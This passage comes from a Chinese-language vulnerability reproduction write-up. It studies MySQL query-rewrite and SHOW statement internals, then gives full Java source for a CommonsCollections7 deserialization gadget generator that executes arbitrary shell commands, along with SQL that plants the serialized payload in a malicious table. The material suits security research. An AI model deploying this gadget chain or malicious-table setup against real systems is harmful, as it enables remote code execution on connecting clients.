---|---|---|---|---|---|---|---  
1 | SHOW SESSION STATUS | NULL | select * from evildb.eviltable | YES | NULL |
NULL | NULL  
  * mysql> call query_rewrite.flush_rewrite_rules();
  * ERROR 1644 (45000): Loading of some rule(s) failed.
调用存储过程刷新时意外失败，查看失败原因:
mysql> select message from query_rewrite.rewrite_rules;
pattern必须是select语句，show语句不行。
据说5.7的pattern只支持select，8.0支持insert、update、delete，未实测验证。
难怪codeplutos要修改rewrite_example.cc。
## 漏洞相关的SQL查询语句
### SHOW SESSION STATUS
    mysql> help SHOW
    ...
    SHOW COLLATION [like_or_where]
    ...
    SHOW [GLOBAL | SESSION] STATUS [like_or_where]
    ...
    If the syntax for a given SHOW statement includes a LIKE 'pattern'
    part, 'pattern' is a string that can contain the SQL % and _ wildcard
    characters. The pattern is useful for restricting statement output to
    matching values.
    ...
URL: 
mysql> help SHOW STATUS
...
URL:
"SHOW SESSION STATUS"访问INFORMATION_SCHEMA.SESSION_STATUS表。参[2]，作者
说访问INFORMATION_SCHEMA.SESSION_VARIABLES表，他应该说错了。
查看INFORMATION_SCHEMA.SESSION_STATUS表结构:
mysql> select table_schema,table_name,column_name,column_type from
information_schema.columns where table_name='SESSION_STATUS';
table_schema | table_name | column_name | column_type  
---|---|---|---  
information_schema | SESSION_STATUS | VARIABLE_NAME | varchar(64)  
information_schema | SESSION_STATUS | VARIABLE_VALUE | varchar(1024)  
直接访问`INFORMATION_SCHEMA.SESSION_STATUS`表缺省会失败:
mysql> select VARIABLE_NAME,VARIABLE_VALUE from
INFORMATION_SCHEMA.SESSION_STATUS limit 10;
ERROR 3167 (HY000): The 'INFORMATION_SCHEMA.SESSION_STATUS' feature is
disabled; see the documentation for 'show_compatibility_56'
需要打开一个开关:
mysql> set @@global.show_compatibility_56=ON;
mysql> select * from INFORMATION_SCHEMA.SESSION_STATUS limit 10; mysql> select
VARIABLE_NAME,VARIABLE_VALUE from INFORMATION_SCHEMA.SESSION_STATUS limit 10;
VARIABLE_NAME | VARIABLE_VALUE  
---|---  
ABORTED_CLIENTS | 1  
ABORTED_CONNECTS | 0  
BINLOG_CACHE_DISK_USE | 0  
BINLOG_CACHE_USE | 0  
BINLOG_STMT_CACHE_DISK_USE | 0  
BINLOG_STMT_CACHE_USE | 0  
BYTES_RECEIVED | 2809  
BYTES_SENT | 11620  
COM_ADMIN_COMMANDS | 0  
COM_ASSIGN_TO_KEYCACHE | 0  
### SHOW COLLATION
mysql> help SHOW COLLATION;
...
URL: 
mysql> SHOW COLLATION WHERE Charset='latin1';
Collation | Charset | Id | Default | Compiled | Sortlen  
---|---|---|---|---|---  
latin1_german1_ci | latin1 | 5 |  | Yes | 1  
latin1_swedish_ci | latin1 | 8 | Yes | Yes | 1  
latin1_danish_ci | latin1 | 15 |  | Yes | 1  
latin1_german2_ci | latin1 | 31 |  | Yes | 2  
latin1_bin | latin1 | 47 |  | Yes | 1  
latin1_general_ci | latin1 | 48 |  | Yes | 1  
latin1_general_cs | latin1 | 49 |  | Yes | 1  
latin1_spanish_ci | latin1 | 94 |  | Yes | 1  
"SHOW COLLATION"访问INFORMATION_SCHEMA.COLLATIONS表。
查看INFORMATION_SCHEMA.COLLATIONS表结构:
mysql> select table_schema,table_name,column_name,column_type from
information_schema.columns where table_name='COLLATIONS';
table_schema | table_name | column_name | column_type  
---|---|---|---  
information_schema | COLLATIONS | COLLATION_NAME | varchar(32)  
information_schema | COLLATIONS | CHARACTER_SET_NAME | varchar(32)  
information_schema | COLLATIONS | ID | bigint(11)  
information_schema | COLLATIONS | IS_DEFAULT | varchar(3)  
information_schema | COLLATIONS | IS_COMPILED | varchar(3)  
information_schema | COLLATIONS | SORTLEN | bigint(3)  
可以直接访问INFORMATION_SCHEMA.COLLATIONS表，与show_compatibility_56无关。
mysql> show variables like 'show_compatibility_56';
Variable_name | Value  
---|---  
show_compatibility_56 | OFF  
mysql> select * from INFORMATION_SCHEMA.COLLATIONS limit 5;
COLLATION_NAME | CHARACTER_SET_NAME | ID | IS_DEFAULT | IS_COMPILED | SORTLE  
---|---|---|---|---|---  
big5_chinese_ci | big5 | 1 | Yes | Yes | 1  
big5_bin | big5 | 84 |  | Yes | 1  
dec8_swedish_ci | dec8 | 3 | Yes | Yes | 1  
dec8_bin | dec8 | 69 |  | Yes | 1  
cp850_general_ci | cp850 | 4 | Yes | Yes | 1  
## 复现漏洞
### GenerateCommonsCollections7.java
    /*
     * javac -encoding GBK -g -cp "commons-collections-3.1.jar" GenerateCommonsCollections7.java
     * java -cp "commons-collections-3.1.jar:." GenerateCommonsCollections7 "/bin/touch /tmp/scz_is_here" /tmp/out.bin
     */
    import java.io.*;
    import java.util.*;
    import java.lang.reflect.*;
    import javax.naming.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    import org.apache.commons.collections.map.LazyMap;
    public class GenerateCommonsCollections7
    {
        /*
         * ysoserial/CommonsCollections7
              */
            @SuppressWarnings("unchecked")
            private static Object getObject ( String cmd ) throws Exception
            {
            Transformer[]   tarray      = new Transformer[]
            {
                new ConstantTransformer( Runtime.class ),
                new InvokerTransformer
                (
                    "getMethod",
                    new Class[]
                    {
                        String.class,
                        Class[].class
                    },
                    new Object[]
                    {
                        "getRuntime",
                        new Class[0]
                    }
                ),
                new InvokerTransformer
                (
                    "invoke",
                    new Class[]
                    {
                        Object.class,
                        Object[].class
                    },
                    new Object[]
                    {
                        null,
                        new Object[0]
                    }
                ),
                new InvokerTransformer
                (
                    "exec",
                    new Class[]
                    {
                        String[].class
                    },
                    new Object[]
                    {
                        new String[]
                        {
                            "/bin/bash",
                            "-c",
                            cmd
                        }
                    }
                )
            };
            Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
            Map             normalMap_0 = new HashMap();
            Map             normalMap_1 = new HashMap();
            Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
            Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
            lazyMap_0.put( "scz", "same" );
            lazyMap_1.put( "tDz", "same" );
            Hashtable       ht          = new Hashtable();
            ht.put( lazyMap_0, "value_0" );
            ht.put( lazyMap_1, "value_1" );
            lazyMap_1.remove( "scz" );
            Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
            f.setAccessible( true );
            f.set( tchain, tarray );
            return( ht );
            }
        public static void main ( String[] argv ) throws Exception
        {
            String              cmd     = argv[0];
            String              out     = argv[1];
            Object              obj     = getObject( cmd );
            FileOutputStream    fos = new FileOutputStream( out );
            ObjectOutputStream  oos = new ObjectOutputStream( fos );
            oos.writeObject( obj );
            oos.close();
            fos.close();
        }
    }
`java -cp "commons-collections-3.1.jar:." GenerateCommonsCollections7
"/bin/touch /tmp/scz_is_here" /tmp/out.bin xxd -p -c 1000000 /tmp/out.bin`
输出形如:
aced00057372...3178
### 创建恶意表
    DROP TABLE IF EXISTS evildb.eviltable;
    DROP DATABASE IF EXISTS evildb;
    CREATE DATABASE IF NOT EXISTS evildb;
    CREATE TABLE IF NOT EXISTS evildb.eviltable
    (
        evil_1  int(5),
        evil_2  blob,
        evil_3  int(5)
    );
    set @obj=0xaced00057372...3178;
    INSERT INTO evildb.eviltable VALUES (1, @obj, 3);
    UPDATE evildb.eviltable SET evil_1=1, evil_2=@obj, evil_3=3;
    select lower(hex(evil_2)) from evildb.eviltable;